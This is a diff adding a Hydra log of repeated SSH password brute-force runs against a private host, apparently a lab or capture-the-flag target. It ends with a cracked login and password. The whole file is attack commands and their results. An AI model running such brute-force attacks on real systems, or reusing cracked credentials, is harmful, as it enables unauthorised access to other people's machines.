@@ -1,0 +1,12 @@
+# Hydra v9.7 run at 2026-10-31 17:27:29 on 10.49.177.139 ssh (hydra -l Anonymous -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:31:07 on 10.49.177.139 ssh (hydra -l www-data -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:31:40 on 10.49.177.139 ssh (hydra -l www-data -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:33:31 on 10.49.177.139 ssh (hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:34:17 on 10.49.177.139 ssh (hydra -l Anonymous -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:42:54 on 10.49.177.139 ssh (hydra -l www-data -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:45:00 on 10.49.177.139 ssh (hydra -l anonymous -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:47:39 on 10.49.177.139 ssh (hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 17:47:58 on 10.49.177.139 ssh (hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 18:04:02 on 10.49.177.139 ssh (hydra -l Anonymous -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+# Hydra v9.7 run at 2026-10-31 18:05:20 on 10.49.177.139 ssh (hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh.txt 10.49.177.139 ssh)
+[22][ssh] host: 10.49.177.139   login: meliodas   password: iloveyou1
